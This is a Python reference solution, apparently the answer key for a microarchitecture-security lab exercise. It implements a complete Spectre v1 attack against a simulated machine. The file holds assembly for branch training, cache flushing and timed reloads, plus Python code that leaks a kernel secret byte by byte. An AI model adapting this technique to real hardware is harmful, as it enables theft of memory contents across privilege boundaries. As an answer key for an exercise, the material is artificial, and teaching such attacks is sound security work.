"""Part 2 -- Spectre v1 through SYS_V1 (REFERENCE SOLUTION: spoilers!).

SYS_V1(x):  if (x < v1_limit) touch PROBE[v1_array[x] * 4096]

The kernel flushes v1_limit before the bounds check, so the branch needs ~150
cycles to resolve.  We train the branch with in-bounds calls, flush the probe
array, call once with x = &secret2[i] - &v1_array (out of bounds), and reload.
The wrong path reads secret2[i] and touches its probe slot before the squash.
"""

TRAIN_CALLS = 6        # 2-bit counters: a few in-bounds calls saturate "not taken"
ATTEMPTS = 8

ATTACK_SRC = """
.data
.align 64
times:  .zero 2048
.text
_start:                             # a0 = malicious x, a1 = in-bounds x, a2 = training calls
    mv      s5, a0
    mv      s6, a1
    mv      s7, a2
    # 1. train the bounds-check branch to predict "in bounds"
train:
    mv      a0, s6
    li      a7, SYS_V1
    syscall
    addi    s7, s7, -1
    bnez    s7, train
    # 2. flush the probe array (training touched one slot)
    li      s0, PROBE_BASE
    li      s1, PROBE_ENTRIES
flush:
    clflush 0(s0)
    addi    s0, s0, PROBE_STRIDE
    addi    s1, s1, -1
    bnez    s1, flush
    # 3. out-of-bounds call: mispredicted, transiently touches PROBE[secret * 4096]
    mv      a0, s5
    li      a7, SYS_V1
    syscall
    # 4. reload
    li      s0, PROBE_BASE
    la      s2, times
    li      s1, PROBE_ENTRIES
reload:
    rdcycle t1
    lb      t0, 0(s0)
    rdcycle t2
    sub     t2, t2, t1
    sd      t2, 0(s2)
    addi    s0, s0, PROBE_STRIDE
    addi    s2, s2, 8
    addi    s1, s1, -1
    bnez    s1, reload
    halt
"""

CALIBRATE_SRC = """
.data
.align 64
x:  .zero 64
.text
_start:
    la      s0, x
    lb      t0, 0(s0)
    rdcycle t1
    lb      t0, 0(s0)
    rdcycle t2
    sub     s2, t2, t1              # hit
    clflush 0(s0)
    rdcycle t1
    lb      t0, 0(s0)
    rdcycle t2
    sub     s3, t2, t1              # miss
    halt
"""


def threshold(m):
    thr = m.user.get("threshold")
    if thr is None:
        prog = m.load(CALIBRATE_SRC)
        hits, misses = [], []
        for _ in range(16):
            r = m.run(prog)
            hits.append(r["s2"])
            misses.append(r["s3"])
        thr = m.user["threshold"] = (sorted(hits)[8] + sorted(misses)[8]) // 2
    return thr


def leak_byte(m, i):
    """Return secret2[i]."""
    thr = threshold(m)
    prog = m.load(ATTACK_SRC)
    x = m.ksyms["k_secret2"] - m.ksyms["k_v1_array"] + i
    times = None
    for _attempt in range(ATTEMPTS):
        # The first attempt usually only brings the secret's line into the cache
        # (the secret load itself misses and the transmit misses the window);
        # the second attempt then leaks.
        m.run(prog, a0=x, a1=i % 16, a2=TRAIN_CALLS)
        times = m.read_u64s(prog["times"], 256)
        hits = [b for b in range(256) if times[b] < thr]
        if len(hits) == 1:
            return hits[0]
    return min(range(256), key=times.__getitem__)
